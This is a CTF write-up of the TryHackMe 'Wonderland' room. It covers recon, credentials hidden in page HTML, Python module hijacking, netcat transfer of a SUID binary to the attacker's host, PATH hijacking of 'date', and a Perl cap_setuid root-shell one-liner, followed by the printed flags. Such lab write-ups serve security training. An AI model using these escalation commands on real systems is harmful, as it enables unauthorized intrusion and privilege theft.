---
layout: single
title: "Wonderland"
link: "https://tryhackme.com/room/wonderland"
parent: TryHackMe
os: Linux
difficulty: Medium
tags: [Steghide, GDB, Python, Perl, Capabilities]
starred: false
date: 2026-02-05
toc: true
toc_sticky: true
toc_label: "Mission Log"
toc_icon: "crosshairs"
---
# CTF Writeup: [{{ page.title }}]({{ page.machine_url }})
{% include ctf-badges.html %}

> **Link:** [**{{ page.parent }}**]({{ page.link }}) |
> **OS:** {{ page.os }} |
> **Difficulty:** {{ page.difficulty }} |
> **Date:** {{ page.date }} |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)

---

## 1. Reconnaissance
### Nmap
Using `nmap` we have `ssh:22` and `http:80` which is a `Golang http server`:
```bash
❯ nmap -sV -sC -T4 <Machine-IP>
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for <Machine-IP>
Host is up (0.95s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Directory enumeration
For this purpose we use `feroxbuster` and `big.txt` wordlist:
```bash
❯ feroxbuster -u http://<Machine-IP> -w kali-wordlists/dirb/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://<Machine-IP>/
 🚩  In-Scope Url          │ <Machine-IP>
 🚀  Threads               │ 50
 📖  Wordlist              │ kali-wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
31s   122822/122822  0s      found:12      errors:0
17s    20469/20469   1240/s  http://<Machine-IP>/
16s    20469/20469   1255/s  http://<Machine-IP>/img/
15s    20469/20469   1396/s  http://<Machine-IP>/poem/
15s    20469/20469   1372/s  http://<Machine-IP>/r/
15s    20469/20469   1385/s  http://<Machine-IP>/r/a/
15s    20469/20469   1385/s  http://<Machine-IP>/r/a/b/
```
Tracing the `http://<Machine-IP>/r/a/b/` we end up on `/r/a/b/b/i/t`.

## 2. Initial Access
Down in the `http://<Machine-IP>/r/a/b/b/i/t/` we can use the `F12` for `Inspect element` and in `Network` section we can find `Response` on right side hiding something from us:
```bash
<body>
. . .
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>
```
This `alice:HowDothTheLittleCrocodileImproveHisShiningTail` is not visible. Let's use this to get initial access with `SSH`:
```bash
❯ ssh alice@<Machine-IP>
alice@<Machine-IP>'s password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
```
Let's see what we have in `SUID`:
```bash
alice@wonderland:~$ sudo -l
[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
So we only have access to the script on alice's home directory which contains:
```bash 
alice@wonderland:~$ cat walrus_and_the_carpenter.py
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.
. . . 
. . .
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
This script slices 10 lines of the poem and shows the line.

## 3. Privilege Escalation
### Rabbit (Python module hijacking)
We know that the script is calling `import random` at the beginning, when this happens python's search priority for module starts with the directory the script is in.

As a result, we can make a file named `random.py` containing:
```python
import os
os.system("/bin/bash")
```
Now we run the script:
```bash
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ whoami
rabbit
```

### Hatter (PATH Hijacking)
Now we can access the home directory of rabbit:
```bash
rabbit@wonderland:/home/rabbit$ ls
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty

rabbit@wonderland:/home/rabbit$ file teaParty
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
```
This is a binary file which can be run as below:
```bash
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 04 Feb 2026 19:06:49 +0000
Ask very nicely, and I will give you some tea while you wait for him
    [Pressed Enter!]
Segmentation fault (core dumped)
```
We see that entering anything will occur with `Segmentation fault` so we have to send it to our own machine and then check the binary for `buffer over flow`. We use `netcat` for this purpose:
```bash
On victim's machine:
rabbit@wonderland:/home/rabbit$ nc -w 3 192.168.179.112 1234 <teaParty

On Attacker machine:
❯ nc -l -p 1234 > teaParty
```
Now we deal with the binary file in our own playground!

For the purpose of looking inside this binary i'll be using `gdb` with `gef` plugin installed.
```bash
❯ gdb teaParty
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  puts@plt
. . .
0x0000000000001170  frame_dummy
0x0000000000001175  main
. . .

##### Let's look more closely into the main function:
gef➤  disassemble main
Dump of assembler code for function main:
   0x0000000000001175 <+0>:     push   rbp
   0x0000000000001176 <+1>:     mov    rbp,rsp
   0x0000000000001179 <+4>:     mov    edi,0x3eb
   0x000000000000117e <+9>:     call   0x1070 <setuid@plt>
   0x0000000000001183 <+14>:    mov    edi,0x3eb
   0x0000000000001188 <+19>:    call   0x1060 <setgid@plt>
   0x000000000000118d <+24>:    lea    rdi,[rip+0xe74]        # 0x2008
   0x0000000000001194 <+31>:    call   0x1030 <puts@plt>
   0x0000000000001199 <+36>:    lea    rdi,[rip+0xea8]        # 0x2048
   0x00000000000011a0 <+43>:    call   0x1040 <system@plt>
   0x00000000000011a5 <+48>:    lea    rdi,[rip+0xedc]        # 0x2088
   0x00000000000011ac <+55>:    call   0x1030 <puts@plt>
   0x00000000000011b1 <+60>:    call   0x1050 <getchar@plt>
   0x00000000000011b6 <+65>:    lea    rdi,[rip+0xf13]        # 0x20d0
   0x00000000000011bd <+72>:    call   0x1030 <puts@plt>
   0x00000000000011c2 <+77>:    nop
   0x00000000000011c3 <+78>:    pop    rbp
   0x00000000000011c4 <+79>:    ret
End of assembler dump.

##### Let's put a break on System on line main+43 to catch the program in the act
gef➤  break *main+43
Breakpoint 1 at 0x11a0
gef➤  run
Welcome to the tea party!
The Mad Hatter will be here soon.

Breakpoint 1, 0x00005555555551a0 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────── registers ────
$rsi   : 0x00005555555592a0  →  "The Mad Hatter will be here soon.\n"
$rdi   : 0x0000555555556048  →  "/bin/echo -n 'Probably by ' && date --date='next h[...]"
$rip   : 0x00005555555551a0  →  <main+002b> call 0x555555555040 <system@plt>
────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd630│+0x0000: 0x00007fffffffd6d0  →  0x00007fffffffd730  →  0x0000000000000000      ← $rsp, $rbp
0x00007fffffffd638│+0x0008: 0x00007ffff7dad575  →  <__libc_start_call_main+0075> mov edi, eax
0x00007fffffffd648│+0x0018: 0x00007fffffffd758  →  0x00007fffffffdc07  →  "wonderland/teaParty"
0x00007fffffffd658│+0x0028: 0x0000555555555175  →  <main+0000> push rbp
──────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555518d <main+0018>      lea    rdi, [rip+0xe74]        # 0x555555556008
   0x555555555194 <main+001f>      call   0x555555555030 <puts@plt>
   0x555555555199 <main+0024>      lea    rdi, [rip+0xea8]        # 0x555555556048
●→ 0x5555555551a0 <main+002b>      call   0x555555555040 <system@plt>
   ↳  0x555555555040 <system@plt+0000> jmp    QWORD PTR [rip+0x2fda]        # 0x555555558020 <system@got.plt>
      0x555555555046 <system@plt+0006> push   0x1
      0x55555555504b <system@plt+000b> jmp    0x555555555020
      0x555555555050 <getchar@plt+0000> jmp    QWORD PTR [rip+0x2fd2]        # 0x555555558028 <getchar@got.plt>
      0x555555555056 <getchar@plt+0006> push   0x2
      0x55555555505b <getchar@plt+000b> jmp    0x555555555020
──────────────────────────────────────────────── arguments (guessed) ────
system@plt (
   $rdi = 0x0000555555556048 → "/bin/echo -n 'Probably by ' && date --date='next h[...]"
)
──────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "teaParty", stopped 0x5555555551a0 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555551a0 → main()
─────────────────────────────────────────────────────────────────────────
Missing rpms, try: dnf --enablerepo='*debug*' install glibc-debuginfo-2.41-16.fc42.x86_64
gef➤  x/s $rdi
0x555555556048: "/bin/echo -n 'Probably by ' && date --date='next hour' -R"
```
Although that `/bin/echo` was carefully executed, `date` is not.
This means that we can hijack the date function here with something similiar to python we did.

* **PATH Hijack:** By creating a malicious 'date' executable in a writable directory and prepending that directory to the $PATH variable, we trick the SUID binary into executing our code with the owner's privileges.

First let's create a file under `/tmp`:
```bash
rabbit@wonderland:/home/rabbit$ echo "/bin/bash" > /tmp/date
rabbit@wonderland:/home/rabbit$ chmod +x /tmp/date
rabbit@wonderland:/home/rabbit$ export PATH=/tmp:$PATH
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by

hatter@wonderland:/home/rabbit$ whoami
hatter
```
What we did was we created an executable `date` which gives us a `bash` shell to use. To make sure this works we need to tell PATH look into `tmp` directory too.

### root (Linux Capablities)
In the home directory of user `hatter` we can see a file named `password.txt` in which we can see:
```bash
hatter@wonderland:/home/hatter$ cat password.txt
WhyIsARavenLikeAWritingDesk?
```
This seems like the `hatter`'s password:
```bash
hatter@wonderland:/home/hatter$ sudo -l
[sudo] password for hatter:
Sorry, user hatter may not run sudo on wonderland.
```
That was the correct password! Now that we can't use `sudo` we have find a way around it. Usually we go for `find` command to see if we have any special powers to use here.
```bash
hatter@wonderland:~$ find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/bin/traceroute6.iputils
. . .
```
There is `traceroute6.iputils` that looks suspicious. Searching for a clue to see what is it and how can we use it led me to a topic on [Linux Privilege Escalation](https://medium.com/@muchiemma/linux-privilege-escalation-3fb61a09f7ba) which explained that this is included in `Linux Capablities` and offered a command:
```bash
hatter@wonderland:~$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```
This command is looking for permissions in the binaries on the system and one of them is indeed `/usr/bin/perl = cap_setuid+ep` which has `+ep` at the end stating `effective` and `permitted`. To understand it better let's look at this:

* **man capablities:** For the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: *privileged processes*... and *unprivileged processes*... Capabilities are a per-thread attribute that... divide the privileges traditionally associated with superuser into distinct units.

This indicates that the Perl binary possesses a specific capability *a granular subset of root privileges* allowing it to perform restricted actions without full administrative access.

More importantly, what can we do with it? That's where we go to [GTFOBins](https://gtfobins.org/gtfobins/perl/) and look for `Perl` under `Capabilities`. We can find:
```bash
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
# whoami
root
```
* **Vulnerability Analysis: `Insecure Capabilities`** The `/usr/bin/perl` binary was granted the `cap_setuid+ep` capability. This allows the Perl interpreter to set the UID of the running process (effectively bypassing standard permissions to become root). An attacker can execute a one-liner to drop into a root shell.

So using this command `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'` we were able to spawn an interactive shell from root (`CAP_SETUID`).
Now let's proceed with flags:
```bash 
# cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
# cat /root/user.txt
thm{"Curiouser and curiouser!"}
```

---

{% comment %}

[Technique]: Steganography Extraction
[Command]: steghide extract -sf white_rabbit_1.jpg
[Why]: Extracts hidden text files (hints/creds) embedded inside image files.

[Technique]: Python Library Hijacking
[Command]: echo 'import os; os.system("/bin/bash")' > random.py
[Why]: Hijacks the 'import random' call in a Sudo script to execute our malicious code instead.

[Technique]: Capabilities Abuse (Perl)
[Command]: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
[Why]: Exploits the cap_setuid+ep capability set on the Perl binary to spawn a root shell.

{% endcomment %}
